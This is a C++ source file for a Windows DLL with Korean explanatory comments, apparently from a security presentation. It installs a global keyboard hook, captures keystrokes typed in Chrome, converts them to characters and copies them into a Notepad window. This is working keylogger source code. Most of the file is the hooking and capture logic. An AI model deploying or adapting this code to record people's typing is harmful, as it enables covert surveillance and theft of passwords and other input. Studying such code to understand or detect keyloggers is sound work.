/*
Hooking_DLL.dll
Made by Tigre000
*/

// 코드 순서대로 주석을 읽으시면 될 것 같습니다!!
// 참고로 원래 export되는 함수들은 파일을 구분해서 만들지만
// 코드가 짧아 편의를 위해 dllmain.cpp 하나에 다 집어넣었습니다
#include "stdafx.h"

HHOOK Hook;						// 이 변수는 후킹 정보가 저장될 변수로 후킹을 할때 받았다가 언후킹을 할때 인자로 주어 후킹을 풉니다
HINSTANCE hIns;					// 이 변수는 DLL의 핸들이 저장될 변수로 DLL이 프로세스에 인젝션 되었을 때 DLL의 핸들을 저장합니다

typedef struct key				// 이 구조체는 키보드 메시지에 관한 부가 정보인 lParam을 나타낸 구조체입니다
{								// 가독성과 코드의 편리성을 위해 넣어 두었습니다
	unsigned repeatCnt : 16;
	unsigned scanCode : 8;
	unsigned extended : 1;
	unsigned reserved : 4;
	unsigned alt : 1;
	unsigned prevPressed : 1;
	unsigned notPressed : 1;
} *KEYINFO;
// 먼저 후킹한 뒤 어떤 동작을 할 것인가, 그 동작을 정하는 함수를 설명하겠습니다
LRESULT CALLBACK Keylog(int code, WPARAM wParam, LPARAM lParam)	// 이 함수는 후킹을 하고 실행한 동작이 담긴 함수입니다
{																	// 하나씩 따라 가도록 하죠
	char path[MAX_PATH];											// 이 배열은 DLL이 인젝션된 프로세스 실행경로(argv[0])을 저장할 변수입니다
	GetModuleFileNameA(NULL, path, MAX_PATH);						// GetModuleFileNameA라는 함수를 통해서 인젝션된 프로세스 실행경로(argv[0])을 저장하게 되고
	char * name = strrchr(path, '\\');								// 저장된 경로에서 프로세스 이름((ex)\chrome.exe)을 추출하여 name이라는 변수에 저장합니다
	if (strncmp(name + 1, "chrome.exe", 10) == 0 && code >= 0)		// 하지만 프로세스 이름 앞에 \가 붙어서 나오기 때문에 name + 1과 chrome.exe를 비교합니다
	{																// 또한 code 값이 0이상일때 if문에 들어가는데 이것은 msdn을 참고해주시기 바랍니다
		HWND proc = GetWindow(FindWindowW(L"Notepad", NULL), GW_CHILD);		// 일단 메모장에다가 보내야하니 메모장의 입력부분의 핸들을 받아오고
		HWND proc2 = GetWindow(FindWindowW(L"Chrome", NULL), GW_CHILD);		// 일단 크롬에도 다시 보내야 상큼하겠죠? 크롬의 핸들도 받아오고
		KEYINFO keyInfo = (KEYINFO)&lParam;									// lParam을 만들어둔 구조체에 저장합니다
		BYTE keyState[256];													// 그리고 KeyState라는 배열을 생성하고
		GetKeyboardState(keyState);											// 현재 키보드 상태를 KeyState 배열에 저장합니다
		WORD ch = 0;														// 이 변수는 wParam, lParam, KeyState를 이용하여 문자로 변환할 때 사용할 변수입니다
		if (!keyInfo->extended && !keyInfo->alt && keyInfo->prevPressed && ToAscii((UINT)wParam, keyInfo->scanCode, keyState, &ch, 0) == 1)	// 펑션, 알트가 눌리지 않고
			SendMessageTimeoutW(proc, WM_CHAR, ch, lParam, SMTO_BLOCK | SMTO_ABORTIFHUNG, 50, NULL);	// 키가 눌릴 때 그 정보가 아스키로 변환 되면 메모장으로 전송!!
			SendMessageTimeoutW(proc2, WM_CHAR, ch, lParam, SMTO_BLOCK | SMTO_ABORTIFHUNG, 50, NULL);	// 메모장으로 전송한 뒤에는 크롬에도 전송!!
		return 1;																						// 그 뒤 메세지는 걍 없앱니다
	}																									// (CallNextHookEx를 사용하여 크롬에 보내면 좀 이상하더라구여..ㅠ)
	return CallNextHookEx(NULL, code, wParam, lParam);													// 당연히 크롬이 아닌 다른 프로세스는 건들지 않습니다
}
// 그 다음에 있는 함수는 이름에서 보이듯이 후킹을 거는 함수입니다
extern "C" __declspec(dllexport) void Hooking(void)
{
	Hook = SetWindowsHookExW(WH_KEYBOARD, Keylog, hIns, 0);	// 발표 당시 설명했던 것처럼 인자를 주고 함수를 실행하면 후킹 성공!!
	printf("Hook!\n");
}
// 이것도 당연히 이름에서 보이듯이 언후킹 하는 함수입니다
extern "C" __declspec(dllexport) void UnHooking(void)
{
	UnhookWindowsHookEx(Hook);		// 그냥 인자 값에 풀고 싶은 후킹 정보를 넣으면 언후킹 성공!!
	Hook = NULL;					// Hook 변수는 다시 초기화를 시켜줍니다
	printf("UnHook!\n");
}
// 이부분은 다들 알다싶이 DLL의 메인함수입니다
BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:	// DLL이 어태치 됬을 때
		hIns = hModule;			// 후킹 함수의 인자로 사용되는 hIns에 자기자신의 핸들을 저장합니다
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}